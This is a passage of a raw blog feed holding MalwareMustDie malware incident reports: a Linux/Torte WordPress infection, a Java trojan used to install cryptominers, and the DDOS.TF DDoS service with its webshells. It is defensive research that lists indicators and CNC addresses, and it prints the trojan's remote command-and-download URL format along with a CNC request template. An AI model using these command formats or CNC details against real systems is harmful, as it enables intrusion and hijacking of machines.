\/\u003EHTTP\/1.1\u003Cbr \/\u003EHost: sk2. touｃhpadz .ｃom \u003Cbr \/\u003EUser-Agent: Mozilla\/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.6)\u003Cbr \/\u003E            {OR} Mozilla\/5.0 (Windows; U; Windows NT 5.1; zh-CN; rv:1.7.6)\u003Cbr \/\u003EAccept: *\/*\u003Cbr \/\u003E\u003C\/pre\u003Ethis should work..Noted, I didn't test it further yet. PS: I secured (read: tweaked it w\/double bytes) some characters in text of sent request traffic template to avoid the false positive.  \u003Cp\u003E\u003Ch2\u003EFollow up \u0026 Epilogue\u003C\/h2\u003E \u003Cp\u003EThe sample we gained from this infection I posted in the kernelmode [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=4181\"\u003Elink\u003C\/a\u003E]. \u003Cbr\u003EThe detection ratio is not bad, you can see it here --\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/800f8b125345784d532b29465b5c57d05287235d3535534186b5edf971bc7fe9\/analysis\/1452567332\/\"\u003E-1-\u003C\/a\u003E] and [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/d4f677f570047fc1bb57cc0dfca19155c3504c72c3ff34b9ab7986c9c216fb90\/analysis\/1452567381\/\"\u003E-2-\u003C\/a\u003E].\u003Cbr\u003EThank's for support from Y (for a good forensics \u0026 evidence collecting effort) \u0026 W (in investigation) from our team. And also to the Akamai team for the good report.  \u003Cp\u003EWe hope this information will be useful for fellow \u003Ci\u003Esysadmins\u003C\/i\u003E, and researchers who follow the threat. All of information was written in a way that hopefully can be reproduced for IR and investigation purpose. \u003Cbr\u003EThe additional information and follow up will be added in this section, as usual.  \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E OTX of \u003Ca href=\"https:\/\/twitter.com\/hashtag\/Linux?src=hash\"\u003E#Linux\u003C\/a\u003E\/Torte infection \u003Ca href=\"https:\/\/t.co\/8qZH6wi6Gt\"\u003Ehttps:\/\/t.co\/8qZH6wi6Gt\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/hashtag\/IOC?src=hash\"\u003E#IOC\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/alienvault\"\u003E@alienvault\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/jaimeblascob\"\u003E@jaimeblascob\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/686912186606718976\"\u003EJanuary 12, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-cards=\"hidden\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E jsm13.php and ra.php have more base64 and xor 2 strings:\u0026#10;\u003Ca href=\"https:\/\/t.co\/RuOYONcTNG\"\u003Ehttps:\/\/t.co\/RuOYONcTNG\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; Travis Green (@travisbgreen) \u003Ca href=\"https:\/\/twitter.com\/travisbgreen\/status\/686938343813169152\"\u003EJanuary 12, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-cards=\"hidden\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E12 new Open rules. 32 new Pro (12\/20). Linux\/Torte, TrochilusRAT, PIVY, etc Tks \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E, \u003Ca href=\"https:\/\/twitter.com\/arbornetworks\"\u003E@arbornetworks\u003C\/a\u003E, all\u0026#10;\u003Ca href=\"https:\/\/t.co\/2z82xXP7BS\"\u003Ehttps:\/\/t.co\/2z82xXP7BS\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ET Labs (@ET_Labs) \u003Ca href=\"https:\/\/twitter.com\/ET_Labs\/status\/687141825367285761\"\u003EJanuary 13, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/yararules\"\u003E@yararules\u003C\/a\u003E pls help create \u0026quot;ELF.Torte\u0026quot; .yar too: \u003Ca href=\"https:\/\/t.co\/oSwj0W6BBB\"\u003Ehttps:\/\/t.co\/oSwj0W6BBB\u003C\/a\u003E\u0026#10;VT: \u003Ca href=\"https:\/\/t.co\/H1vIWoOvnf\"\u003Ehttps:\/\/t.co\/H1vIWoOvnf\u003C\/a\u003E \u003Ca href=\"https:\/\/t.co\/mQCDG5Acjf\"\u003Ehttps:\/\/t.co\/mQCDG5Acjf\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/sempersecurus\"\u003E@sempersecurus\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; ☩MalwareMustDie (@MalwareMustDie) \u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\/status\/687405592588234754\"\u003EJanuary 13, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cblockquote class=\"twitter-tweet\" data-conversation=\"none\" data-lang=\"en\"\u003E\u003Cp lang=\"en\" dir=\"ltr\"\u003E\u003Ca href=\"https:\/\/twitter.com\/MalwareMustDie\"\u003E@MalwareMustDie\u003C\/a\u003E \u003Ca href=\"https:\/\/twitter.com\/sempersecurus\"\u003E@sempersecurus\u003C\/a\u003E I hope that this rule works \u003Ca href=\"https:\/\/t.co\/QnoitBTI8l\"\u003Ehttps:\/\/t.co\/QnoitBTI8l\u003C\/a\u003E\u003C\/p\u003E\u0026mdash; Yara Rules (@yararules) \u003Ca href=\"https:\/\/twitter.com\/yararules\/status\/697096093595783168\"\u003EFebruary 9, 2016\u003C\/a\u003E\u003C\/blockquote\u003E\u003Cscript async src=\"\/\/platform.twitter.com\/widgets.js\" charset=\"utf-8\"\u003E\u003C\/script\u003E \u003Cp\u003E#MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/211810280814370279\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/01\/mmd-0050-2016-incident-report-elf.html#comment-form","title":"1 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/211810280814370279"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/211810280814370279"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/01\/mmd-0050-2016-incident-report-elf.html","title":"MMD-0050-2016 - Incident report: ELF Linux\/Torte infection (in Wordpress)"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"media$thumbnail":{"xmlns$media":"/web/20160930230250/http://search.yahoo.com/mrss/","url":"https:\/\/lh3.googleusercontent.com\/-h9jmyqlt3_w\/VpQLW_qrc7I\/AAAAAAAAUPQ\/LHMGunEdy34\/s72-c\/001.png","height":"72","width":"72"},"thr$total":{"$t":"1"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-3523642417067088778"},"published":{"$t":"2016-01-09T03:50:00.001-08:00"},"updated":{"$t":"2016-01-10T14:37:30.158-08:00"},"title":{"type":"text","$t":"MMD-0049-2016 - A case of java trojan (downloader\/RCE) for remote minerd hack"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E\u003Cp\u003EThis is a \u003Ci\u003Eshort post\u003C\/i\u003E for supporting the takedown purpose. Warning: Sorry, this time there's nothing fancy nor \"in-depth analysis\" :-) Yet the current hacking \u0026 infecting scheme is so bad, so I think it's best for all of us (fellow \u003Ci\u003Esysadmins\u003C\/i\u003E in particular) to know this information for mitigation and hardening purpose.  \u003Cp\u003EIn this case, a bad actor was using java coded malware injected to a \u003Ci\u003E\"base infection\"\u003C\/i\u003E -  a compromised windows machine (via \u003Ci\u003Eusual \u003C\/i\u003Eremote windows service exploit hack method), to be used as a remote command execution (RCE) to the \u003Ci\u003Eother\u003C\/i\u003E hacked victim's machines, or, to be used as multiple-OS trojan downloader for attacking other machines. The trojan is supposed to be executed under \u003Ci\u003Ejava environment\u003C\/i\u003E on the targeted machines, from a remote by URL with \u003Ci\u003Earguments\u003C\/i\u003E as an API, to perform code execution or download functions.  \u003Cp\u003EIn the current finding, this Java trojan is used to install the \u003Cb\u003E\u003Ci\u003Eminerd\u003C\/i\u003E\u003C\/b\u003E into several targets. The Java trojan's download panel, the \u003Ci\u003EHFS web server\u003C\/i\u003E, is installed on a hacked host in South Korea network by the suspected bad actor from \u003Ci\u003EPRC\/China\u003C\/i\u003E. (Yes, even it sounds like I'm pointing finger here, the threat source information is solid, do trace its bitcoin hash for PoC or the used tools).  \u003Cp\u003EThe detection of the Java malware is always low, why we think the awareness of the threat is also important to raise its detection ratio (if possible).  \u003Cp\u003E\u003Ch2\u003EThe HFS panel\u003C\/h2\u003E \u003Cp\u003EIt was informed to our group by our friends (thank's to 김영욱) about the infection panel in here:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-Ijpbpkz2f50\/VpDp9pFNO4I\/AAAAAAAAUNY\/qjlqrJLkiRs\/s5120\/001.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-Ijpbpkz2f50\/VpDp9pFNO4I\/AAAAAAAAUNY\/qjlqrJLkiRs\/s580\/001.png\u003E\u003C\/a\u003E\u003Cbr\u003EThis panel is spotted in South Korea friend's network (victim) I hope this post can be used as reference for good people over there to delete the malware. The \u003Cb\u003E\u003Ci\u003Eoss.war\u003C\/i\u003E\u003C\/b\u003E is the java trojan we described above.  \u003Cp\u003EIn each directory it also spotted the minerd installer script:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-9CSzxtjWLRM\/VpDp-X8sZrI\/AAAAAAAAUNs\/1qNl6rVaY6E\/s5115\/005.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-9CSzxtjWLRM\/VpDp-X8sZrI\/AAAAAAAAUNs\/1qNl6rVaY6E\/s580\/005.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E..it was written in bash that is containing the information of the suspected actor.  \u003Cp\u003E\u003Ch2\u003ETrojan downloader \u0026 remote command execution\u003C\/h2\u003E \u003Cp\u003EIt's a java coded malware as per seen in below:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-3CGP_WV8Upg\/VpDp9tArKSI\/AAAAAAAAUNc\/ql7CPNWa_X8\/s5120\/002.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-3CGP_WV8Upg\/VpDp9tArKSI\/AAAAAAAAUNc\/ql7CPNWa_X8\/s520\/002.png\u003E\u003Cbr\u003E\u003C\/a\u003EIt has arguments to be used during the remote access with URL format looks like below:\u003Cfont color=red\u003E\u003Ci\u003E\u003Cpre\u003Ehttp:\/\/[BASE_INFECTION_PANEL]\/oss.war?{cmd=base64]\u0026winurl=[base64]\u0026linurl=[base64]\u003C\/pre\u003E\u003C\/i\u003E\u003C\/font\u003EEach argument is in \u003Cb\u003E\u003Ci\u003Ebase64 \u003C\/i\u003E\u003C\/b\u003Eencoded:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-OP1JLoTuoto\/VpDp-KB6ZQI\/AAAAAAAAUNk\/rIopmz9fW8U\/h120\/003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-OP1JLoTuoto\/VpDp-KB6ZQI\/AAAAAAAAUNk\/rIopmz9fW8U\/s580\/003.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThese are the \u003Ci\u003Edownload function \u003C\/i\u003E and \u003Ci\u003Eremote execution function \u003C\/i\u003Ecoded:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-xkcyzgWpnPY\/VpDp-Fw676I\/AAAAAAAAUNw\/TA6cPhgl3iA\/s5120\/004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-xkcyzgWpnPY\/VpDp-Fw676I\/AAAAAAAAUNw\/TA6cPhgl3iA\/s580\/004.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EWe believe it's coded in Java to support multiple operating system infection scheme, and even in this case it was set to download \u003Ci\u003Eminerd\u003C\/i\u003E installation bash script, the Java malware itself was generically designed in a way that can be used for many infection implementation..  \u003Cp\u003EAs per written above, the detection ratio is low, but  I never see high detection for any java coded applet or \u003Cb\u003E.jar \u003C\/b\u003Esince my first day hunting malware in web--\u003E[\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/90af405d8b1b36d380e9aeadbfbd18b6736b3823afd61899a410d75d0bec4602\/analysis\/1452336805\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-WHe4Kc4nJJI\/VpDp9ZTKjJI\/AAAAAAAAUNg\/6AkbAU_S4Es\/s5120\/000.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-WHe4Kc4nJJI\/VpDp9ZTKjJI\/AAAAAAAAUNg\/6AkbAU_S4Es\/s580\/000.png\u003E\u003C\/a\u003E \u003Cp\u003E\u003Ch2\u003EMalicious installation minerd\u003C\/h2\u003E \u003Cp\u003EBitcoin mining is okay, But hacking other's country machine for mining is bad. In this case is just worse than \"bad\" since the scheme is being used to hack multiple machines for bitcoin mining.   \u003Cp\u003EThere are some directories with the extracted bitcoin installer already remotely used to infect victim's machine(s), and in each of the directory there's a \u003Cb\u003Eone.tar\u003C\/b\u003E file [\u003Ca href=\"https:\/\/www.virustotal.com\/en\/file\/fdb428b923a5919a56dc8349bfe7ede3b14707ae8f0f8dcbe214337d35c46d79\/analysis\/1452339639\/\"\u003Elink\u003C\/a\u003E], which is actually a \u003Ci\u003Ebash script\u003C\/i\u003E to be \u003Cb\u003Eremotely\u003C\/b\u003E executed to install a \u003Cb\u003Eminerd \u003C\/b\u003E(a bit coin mining *NIX software). This remote execution can be done using Java malware remote execution function.\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-LjwX9uw-52s\/VpDp-nhQFCI\/AAAAAAAAUN8\/ZHGvaD9TuIY\/s5120\/006.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-LjwX9uw-52s\/VpDp-nhQFCI\/AAAAAAAAUN8\/ZHGvaD9TuIY\/s580\/006.png\u003E\u003C\/a\u003E\u003Cbr\u003EWell, I think the comments I wrote in the snippet picture above explained much of the badness and the link for the next investigation. Ah, yes, it's downloading the x86-64 ELF minerd. \u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-iwOJnWZ8V-4\/VpEPFdOcSjI\/AAAAAAAAUOg\/xUMiFo95PPs\/s5120\/008.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-iwOJnWZ8V-4\/VpEPFdOcSjI\/AAAAAAAAUOg\/xUMiFo95PPs\/s340\/008.png\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-nm2UbvXl_3I\/VpDp-44YmGI\/AAAAAAAAUOE\/mdpW5E-1poc\/s5120\/007.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-nm2UbvXl_3I\/VpDp-44YmGI\/AAAAAAAAUOE\/mdpW5E-1poc\/s580\/007.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E\u003Cfont color=brown\u003E\u003Cb\u003ETips for IR team investigators:\u003C\/b\u003E\u003C\/font\u003E If the authority can access the base-infection machine, they can see the HFS web server log file (which is dumped also in memory that can be gained by forensics, just in case the bad actor deleting the log) to check which remote victim machines that were exploited for this malicious mining.  \u003Cp\u003E\u003Ch2\u003EEpilogue \u0026 follow-up\u003C\/h2\u003E \u003Cp\u003EThank's for everyone involved in this matter. Please bare with this simple short post.\u003Cbr\u003EThe usage java for this purpose is not nice \u0026 it's good to know.\u003Cbr\u003EI post the sample in kernelmode [\u003Ca href=\"http:\/\/www.kernelmode.info\/forum\/viewtopic.php?f=16\u0026t=4176\u0026p=27598#p27598\"\u003Elink\u003C\/a\u003E]. \u003Cbr\u003EThank's in advance for the S.Korea friends for the cleanup, below is more info of the network: \u003Cpre class=\"brush: javascript\"\u003E  \"ip\": \"202.68.226.59\",\u003Cbr \/\u003E  \"region\": \"Seoul\",\u003Cbr \/\u003E  \"country\": \"KR\",\u003Cbr \/\u003E  \"loc\": \"37.5985,126.9783\",\u003Cbr \/\u003E  \"org\": \"AS38086 IP4 Networks,Inc.(cwsys.net)\"\u003Cbr \/\u003E  \"prefix\": \"202.68.224.0\/20\"\u003C\/pre\u003E\u003Cp\u003E#MalwareMustDie!"},"link":[{"rel":"replies","type":"application/atom+xml","href":"http:\/\/blog.malwaremustdie.org\/feeds\/3523642417067088778\/comments\/default","title":"Post Comments"},{"rel":"replies","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/01\/mmd-0049-2016-case-of-java-trojan.html#comment-form","title":"0 Comments"},{"rel":"edit","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3523642417067088778"},{"rel":"self","type":"application/atom+xml","href":"http:\/\/www.blogger.com\/feeds\/8268358095554400245\/posts\/default\/3523642417067088778"},{"rel":"alternate","type":"text/html","href":"http:\/\/blog.malwaremustdie.org\/2016\/01\/mmd-0049-2016-case-of-java-trojan.html","title":"MMD-0049-2016 - A case of java trojan (downloader\/RCE) for remote minerd hack"}],"author":[{"name":{"$t":"unixfreaxjp"},"email":{"$t":"noreply@blogger.com"},"gd$image":{"rel":"/web/20160930230250/http://schemas.google.com/g/2005#thumbnail","width":"32","height":"32","src":"\/\/2.bp.blogspot.com\/-iTSFZlPaBR0\/U5DrOe7GA0I\/AAAAAAAAQL0\/NtZkh4YTXR8\/s113\/*"}}],"thr$total":{"$t":"0"}},{"id":{"$t":"tag:blogger.com,1999:blog-8268358095554400245.post-2277574436230007453"},"published":{"$t":"2016-01-04T18:39:00.001-08:00"},"updated":{"$t":"2016-04-10T09:39:57.973-07:00"},"title":{"type":"text","$t":"MMD-0048-2016 - DDOS.TF = (new) ELF \u0026 Win32 DDoS service with ASP + PHP\/MySQL MOF webshells"},"content":{"type":"html","$t":"\u003Cp\u003E\u003Ch2\u003EBackground\u003C\/h2\u003E \u003Cp\u003ELinux exploitation by bad actors from People Republic of China (in short: PRC) is not a new matter. Their attacks are coming everyday and their method is also improving by days.   \u003Cp\u003EThis post is another case of the issue, except it is reporting you some improvement and new source of DoS threat from the same landscape. The unique point of this one is by combining ElasticSearch exploitation for Linux boxes AND also aiming Windows machines via a malicious MOF (Managed Object Format) coded in a malicious PHP-MySQL webshell to exploit the WMI (Windows Management Instrumentation) architecture to remotely upload\/execute any desired payload for infection. Obviously the windows infection pattern is targeting old systems with \u003Ci\u003E__EventConsumer\u003C\/i\u003E runs in SYSTEM privilege (Windows XP and Windows 2003 Server). There are also an ASP web shell and some hacktools spotted.  \u003Cp\u003EThe combination of the above threat is wrapped in a single multi purpose CNC GUI panel, that can control and monitor the attack performed, until the DDoS activity, for Linux and Windows client basis ddosers.   \u003Cp\u003EThe ELF malware used as bot client for DDoS purpose is a \u003Ci\u003Enew coded one\u003C\/i\u003E, firstly spotted it in December 5th 2015,and the bad actors is synchronizing the latest version with its CNC GUI server software. Yes, we have a new threat here. As for the Windows PE DDoSer it was checked by our team (thank's B) as a variant of \u003Ci\u003ELinux\/MrBlack\u003C\/i\u003E malware in Win32 version. In this post we named the new malware found as \u003Cb\u003ELinux\/DDOSTF\u003C\/b\u003E variant.  \u003Cp\u003E\u003Ch2\u003EThe Wrath DDoS Stresser Service \/ 天罚DDoS集群压力测试系统\u003C\/h2\u003E \u003Cp\u003EIt's all started by and centered to this \"wanna-look-legit\" Chinese origin DDoS service. Which its site is in the domain of \u003Cb\u003Eddos.tf\u003C\/b\u003E , this time we quicky took the snapshot of the site for the audience safe view in here [\u003Ca href=\"http:\/\/www.geocities.jp\/arc_ocd\/ddos.tf\/\"\u003Elink\u003C\/a\u003E]\u003Cbr\u003E. You can browse this service's information safely about the \"features\" promoted in the snapshot site by using google translation, to give you a good idea what this site is doing.   \u003Cp\u003EIn the top page, there is a snapshot picture of the DDoS CNC server software panel of its ELF botnet\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-wwCu_yO9BDg\/VoqNCH2LmtI\/AAAAAAAAUGc\/5exeTAGhWO8\/s4120\/004.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-wwCu_yO9BDg\/VoqNCH2LmtI\/AAAAAAAAUGc\/5exeTAGhWO8\/s580\/004.PNG\u003E\u003C\/a\u003E\u003Cbr\u003Ewhich is showing the recent last version (version 6) of the DDoS client\/server malware served. In a glimpse it looks exactly like the BillGates CNC tools by the design, I think they managed to copy it, somehow.  \u003Cp\u003EA lot of features was promoted in the 2nd tab, which we suggest the investigator to translate  \u0026 read them for its correlation to the malware in this case, and in the third menu tab you can view some clear snapshots they made for the alternative older versions from 3,4,5 which is showing its support to Linux and Windows DDoS bot client managed by the one-centered CNC panel.   \u003Cp\u003EIn the bottom of the page you will see the web exploitation tool they use to gain privilege to windows machine, using the .asp(x) script to get the payload installed \u0026 (flood) attack controllers:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-E7QkU7u-g4E\/VoqQSBCtnKI\/AAAAAAAAUGo\/bpozCHc5CIE\/s4120\/003.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-E7QkU7u-g4E\/VoqQSBCtnKI\/AAAAAAAAUGo\/bpozCHc5CIE\/s580\/003.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EI think these are real snapshots with having some slight modification for promotion purpose. Apparently we have a very serious player here. And that's linked to the information in the next tab.  \u003Cp\u003EIn the 4th tab you can see the price list information of using this service, and how to reach the actor for the payment purpose (see:264164661 part)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-m9OaTYaGYaw\/Vot8ndx32lI\/AAAAAAAAUMk\/eJI4JkC1a5s\/s4120\/016.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-m9OaTYaGYaw\/Vot8ndx32lI\/AAAAAAAAUMk\/eJI4JkC1a5s\/s580\/016.PNG\u003E\u003C\/a\u003E\u003Cbr\u003E..and in the 5th tab it's showing the \u003Cb\u003E\"disclaimer\"\u003C\/b\u003E too as per following original chinese language (I copy pasted for you to automate-translating): \u003Cpre class=\"brush: javascript\"\u003E申明:天罚集群压力测试系统仅用于机房压力测试，若有违反国家法律后果自负！\u003Cbr \/\u003E1：关于产品：本站产品仅限于个人及企业压力测试自身防火墙性能之用途，\u003Cbr \/\u003E   不当使用本站软件所造成的任何后果本站(天罚工作室)不承担任何责任，\u003Cbr \/\u003E   此相关类似声明在官网及使用协议中均作出明显说明；\u003Cbr \/\u003E2：关于业务：本站不提供任何相关攻击测试业务和非法主机(肉鸡)出售租赁业务；\u003Cbr \/\u003E   只会按照部分客户实际需求可能提供联系渠道，此附加服务不在实际承诺交易范围内，\u003Cbr \/\u003E   交易纠纷涉及范围仅限软件产品服务本身；\u003Cbr \/\u003E至于软件的效果也不要来问我，你来问我我肯定说好 有什么意义，\u003Cbr \/\u003E一个小小的免费版效果就那么强大，呵呵！你懂得！\u003Cbr \/\u003E\u003C\/pre\u003Ewhich is basically explaining that the author is not responsible for any bad usage..urging customers to use it for personal purpose only, and business usage guideline..and blah blah info for contacting the actor.  \u003Cp\u003E\u003Ch2\u003EIs it as legal as it's stated?\u003C\/h2\u003E \u003Cp\u003EGood question. And the answer is \u003Cb\u003E\u003Ci\u003Eobviously \u003C\/i\u003ENOT\u003C\/b\u003E, below is our argument:  \u003Cp\u003EOnce upon a time, about 24+ hours ago, there's an attack coming to \u003Ci\u003Ean innocent \u003Ci\u003EElasticSearch \u003C\/i\u003Eserver\u003C\/i\u003E from this panel:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-MbR0cyH1QdM\/VoqU5pPLAvI\/AAAAAAAAUG0\/hER4O9ViQQc\/s4120\/002a.png\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-MbR0cyH1QdM\/VoqU5pPLAvI\/AAAAAAAAUG0\/hER4O9ViQQc\/s580\/002a.png\u003E\u003C\/a\u003E\u003Cbr\u003EAnd a red-handed evidence was spotted during an effort to infect this \u003Ci\u003Einnocent\u003C\/i\u003E Linux server using downloaded ELF malware files from that a malware HFS web panel to this victim host:\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-sis1OhaB-Qk\/VoqWUq6Ns_I\/AAAAAAAAUHA\/pT5cvI0iNWs\/s4120\/002b.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-sis1OhaB-Qk\/VoqWUq6Ns_I\/AAAAAAAAUHA\/pT5cvI0iNWs\/s580\/002b.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe attacker was using the \u003Ci\u003EElasticSearch\u003C\/i\u003E known vulnerability\/exploit (thank's for the log) and that ATTACKER-PANEL is the ip of the panel mentioned in picture snapshot above. \u003Ci\u003EP.S.:we will disclose the IP after the threat is taken down.\u003C\/i\u003E \u003Cp\u003EThe ELF file \u003Ci\u003Eudp\u003C\/i\u003E and \u003Ci\u003Esyb \u003C\/i\u003E downloaded are known ELF Linux\/BillGates malware variant (with encoded commands in the codes to make reversing difficult..which was FAILED) and are using IP basis CNC in \u003Cb\u003E173.254.236.97:25000\u003C\/b\u003E. The host that's used as CNC is in United States with below detail: \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"173.254.236.97\",\u003Cbr \/\u003E  \"hostname\": \"173.254.236.97.static.quadranet.com\",\u003Cbr \/\u003E  \"city\": \"Los Angeles\",\u003Cbr \/\u003E  \"region\": \"California\",\u003Cbr \/\u003E  \"country\": \"US\",\u003Cbr \/\u003E  \"loc\": \"34.0438,-118.2512\",\u003Cbr \/\u003E  \"org\": \"AS8100 QuadraNet, Inc\",\u003Cbr \/\u003E  \"postal\": \"90014\"\u003Cbr \/\u003E\u003C\/pre\u003EThe panel also contains the older made of \u003Cb\u003ELinux\/BillGates\u003C\/b\u003E (CNC is IP basis \u003Cb\u003E122.114.124.26:25000\u003C\/b\u003E) and Linux\/Elknot.freeBSD (CNC is IP basis 122.114.124.26:11223)\u003Cbr\u003E\u003Ca href=\"https:\/\/lh3.googleusercontent.com\/-vtwNE3qmezE\/VorFhcRh4GI\/AAAAAAAAUIk\/psV2Luhvh9Y\/s4061\/003a.PNG\"\u003E\u003Cimg src=https:\/\/lh3.googleusercontent.com\/-vtwNE3qmezE\/VorFhcRh4GI\/AAAAAAAAUIk\/psV2Luhvh9Y\/s580\/003a.PNG\u003E\u003C\/a\u003E\u003Cbr\u003EThe geo location of IP 122.114.124.26: \u003Cpre class=\"brush: asm\"\u003E  \"ip\": \"122.114.124.26\",\u003Cbr \/\u003E  \"hostname\": \"No Hostname\",\u003Cbr \/\u003E  \"city\": \"Zhengzhou\",\u003Cbr \/\u003E  \"region\": \"Henan Sheng\",\u003Cbr \/\u003E  \"country\": \"CN\",\u003Cbr \/\u003E  \"loc\": \"34.6836,113.5325\",\u003Cbr \/\u003E  \"org\": \"AS37943 ZhengZhou GIANT Computer Network Technology Co., Ltd\"\u003Cbr \/\u003E\u003C\/pre\u003EThere are also six files of accompanied new type of ELF DDoSers.  \u003Cp\u003EBut what's the connection of this panel with the \u003Cb\u003Eddos.tf \u003C\/b\u003E? \u003Cbr\u003EIn the next section the connection of this panel to the \u003Cb\u003Eddos.tf \u003C\/b\u003Ewill be seen clear as ice..  \u003Cp\u003EAs the additional information, in the \u003Cb\u003Eddos.tf\u003C\/b\u003E site, there are some archives hidden inside that one of them contains the infamous \u003Cb\u003E\u003Ci\u003Es.exe\u003C\/i\u003E\u003C\/b\u003E with its pairs of \u003Ci\u003Eip.txt\u003C\/i\u003E and \u003Ci\u003Epass.txt\u003C\/i\u003E, the SSH weak credential bruter tool... In the legit site?? Hmm..\u003Cbr\u003E\u003Ca 